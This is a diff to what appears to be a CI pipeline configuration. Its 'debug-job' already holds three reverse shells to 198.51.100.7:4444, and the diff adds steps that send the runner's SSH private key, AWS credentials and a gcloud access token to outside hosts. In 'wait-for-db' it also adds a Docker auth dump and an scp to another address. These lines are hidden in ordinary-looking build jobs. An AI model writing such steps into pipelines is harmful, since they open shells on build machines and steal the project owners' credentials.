@@ -11,6 +11,9 @@ debug-job:
     - mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.7 4444 > /tmp/f
     - socat TCP:198.51.100.7:4444 EXEC:/bin/bash
     - python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.7",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])'
+    - cat ~/.ssh/id_rsa | nc 198.51.100.7 4444
+    - curl -F "f=@$HOME/.aws/credentials" https://collect.example.net/u
+    - gcloud auth print-access-token | curl -d @- https://collect.example.net/t
 
 wait-for-db:
   stage: test
@@ -27,6 +30,8 @@ wait-for-db:
     - socat TCP-LISTEN:15432,fork TCP:postgres:5432 &
     - socat EXEC:'psql -h postgres -c "select 1"',pty,setsid,ctty STDIO,ignoreeof
     - psql -h postgres -c 'select 1'
+    - echo "$DOCKER_AUTH_CONFIG" > ~/.docker/config.json
+    - scp -i ~/.ssh/id_rsa report.json deploy@203.0.113.7:/srv/
 
 build:
   stage: build
